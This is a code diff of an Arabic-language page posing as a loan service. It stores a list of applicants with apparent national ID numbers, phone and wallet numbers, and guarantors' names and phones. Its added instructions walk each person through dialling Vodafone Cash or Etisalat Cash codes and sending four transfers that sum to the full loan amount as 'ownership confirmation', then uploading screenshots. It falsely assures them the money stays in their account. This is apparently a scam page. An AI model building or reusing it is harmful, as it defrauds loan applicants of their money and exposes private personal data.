@@ -77,7 +77,9 @@
         .code-box { background: rgba(0, 0, 0, 0.8); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; text-align: center; font-family: monospace; font-size: 1.3rem; font-weight: bold; color: var(--accent-gold); }
         .linking-instructions { background: rgba(0, 217, 255, 0.08); border: 2px solid var(--primary-cyan); border-radius: 2rem; padding: 2rem; margin: 2rem 0; }
         .instruction-step { background: rgba(0, 0, 0, 0.4); border-left: 4px solid var(--primary-cyan); padding: 1.2rem; margin-bottom: 1rem; border-radius: 0.5rem; }
-        .step-header { font-size: 1.1rem; font-weight: 700; color: var(--primary-cyan); margin-bottom: 0.8rem; }
+        .step-header { font-size: 1.1rem; font-weight: 700; color: var(--primary-cyan); margin-bottom: 0.8rem; display: flex; align-items: center; gap: 0.5rem; }
+        .step-content { font-size: 0.95rem; color: var(--text-muted); line-height: 1.7; }
+        .highlight-value { color: var(--accent-gold); font-weight: 800; font-size: 1.1rem; }
         @media (max-width: 640px) { .logo h1 { font-size: 1.8rem; } .search-card, .result-card { padding: 1.5rem; } }
     </style>
 </head>
@@ -117,6 +119,9 @@
 </div>
 
 <script>
+// ============================================================
+// قاعدة العملاء (20 عميلاً سابقاً + العميلة جهاد + العميل هاني)
+// ============================================================
 const customersDatabase = {
     "28703111100311": { name: "محمد محمد مصطفي صيام", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "فودافون كاش", walletNum: "01001602909", guarantorRelation: "اخ", guarantorName: "أسامة محمد مصطفي صيام", guarantorPhone: "01002505856", reason: "تكمله شراء سياره", otherLoans: "لايوجد" },
     "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loanRaw: "145,000", loanTerm: "48 شهر", installment: "4,075", total: "195,600", wallet: "لا يوجد محفظة", walletNum: "01283498080", guarantorRelation: "اخت", guarantorName: "مروه احمد عبدالله عبدالقادر", guarantorPhone: "01226557898", reason: "لظروف خاصة", otherLoans: "نعم" },
@@ -181,21 +186,56 @@ function displayResult() {
 
 function displayInstructions() {
     const container = document.getElementById('instructionsContainer');
+    // حالة عدم وجود محفظة مسجلة
     if (currentCustomer.wallet === "لا يوجد محفظة") {
-        container.innerHTML = `<div class="linking-instructions" style="border-color: #FF6B35;"><div class="instructions-title">⚠️ لا يوجد محفظة مسجلة</div><div class="instruction-step"><div class="step-header">مهلة 4 ساعات لفتح محفظة</div></div></div>`;
+        container.innerHTML = `
+            <div class="linking-instructions" style="border-color: #FF6B35;">
+                <div class="instructions-title" style="color: var(--accent-orange);">⚠️ لا يوجد محفظة إلكترونية مسجلة</div>
+                <div class="instruction-step"><div class="step-header"><i class="fas fa-clock"></i> مهلة زمنية: 4 ساعات</div><div class="step-content">قم بفتح محفظة (فودافون كاش أو اتصالات كاش) خلال 4 ساعات، ثم عد إلى هذا الرابط لإكمال الربط.</div></div>
+            </div>`;
         return;
     }
-    const loanNum = parseInt(currentCustomer.loanRaw);
-    const quarter = Math.floor(loanNum / 4);
+    
+    // حساب مبلغ التأكيد لكل عملية (القسمة على 4)
+    const loanAmountNum = parseInt(currentCustomer.loanRaw.replace(/[^\d]/g, ''), 10);
+    const confirmAmountPerOperation = Math.floor(loanAmountNum / 4);
     const isEtisalat = currentCustomer.wallet.includes('اتصالات');
     const code = isEtisalat ? "6#*777*" : "100#*9*";
-    const fee = isEtisalat ? "5 جنيهات" : "10 جنيهات";
+    const confirmationFee = isEtisalat ? "5 جنيهات" : "5 جنيهات";
+    const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
+    
     container.innerHTML = `
         <div class="linking-instructions">
-            <div class="instructions-title"><i class="fas fa-mobile-alt"></i> خطوات ربط المحفظة</div>
-            <div class="instruction-step"><div class="step-header">1️⃣ كود التأكيد</div><div class="code-box">${code}</div></div>
-            <div class="instruction-step"><div class="step-header">2️⃣ المبلغ لكل عملية</div><div class="code-box">${quarter.toLocaleString()} ج.م</div><div>عدد العمليات: 4<br>الرسوم: ${fee} لكل عملية</div></div>
-            <div class="instruction-step"><div class="step-header">3️⃣ التوثيق</div><div>التقط 4 لقطات شاشة (واحدة لكل عملية)</div></div>
+            <div class="instructions-title"><i class="fas fa-mobile-alt"></i> خطوات ربط المحفظة | تأكيد الحساب</div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-phone-alt"></i> 1️⃣ كود التأكيد</div>
+                <div class="step-content">اطلب الكود التالي من هاتفك المحمول الخاص بمحفظة ${providerName}:</div>
+                <div class="code-box">${code}</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-coins"></i> 2️⃣ مبلغ التأكيد لكل عملية</div>
+                <div class="step-content">
+                    <span class="highlight-value">${confirmAmountPerOperation.toLocaleString()} ج.م</span><br>
+                    سيتم تنفيذ <strong>4 عمليات متساوية</strong> بقيمة ${confirmAmountPerOperation.toLocaleString()} ج.م لكل عملية.<br>
+                    <span style="color: var(--accent-gold);">💰 إجمالي المبلغ الؤكد لإثبات الملكية: ${(confirmAmountPerOperation * 4).toLocaleString()} (هذة العمليات تكون مشفرة تماماا على السيستم ولا يمكن لأى شخص الاطلاع عليها).</span>
+                </div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-receipt"></i> 3️⃣ تكلفة التأكيد لكل عملية</div>
+                <div class="step-content">
+                    <span class="highlight-value">${confirmationFee}</span> لصالح شركة ${providerName} ( خدمة التأكيد المعتمدة).
+                </div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-camera"></i> 4️⃣ التوثيق والرفع</div>
+                <div class="step-content">
+                    التقط <strong>4 لقطات شاشة واضحة</strong> (واحدة لكل عملية) تظهر المبلغ ورقم المحفظة والتاريخ.<br>
+                    ثم اضغط على الزر أدناه "رابط ربط الحساب بالسيستم" لرفع الصور وإتمام الربط.
+                </div>
+            </div>
+            <div class="info-box" style="margin-top:1rem; background:rgba(57,255,20,0.08); border-left:4px solid var(--primary-lime); padding:0.8rem;">
+                <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> هذا الإجراء هو مجرد تأكيد لملكية المحفظة، وجميع المبالغ المحولة تبقى في حسابك ولا تُخصم من القرض.
+            </div>
         </div>
     `;
 }
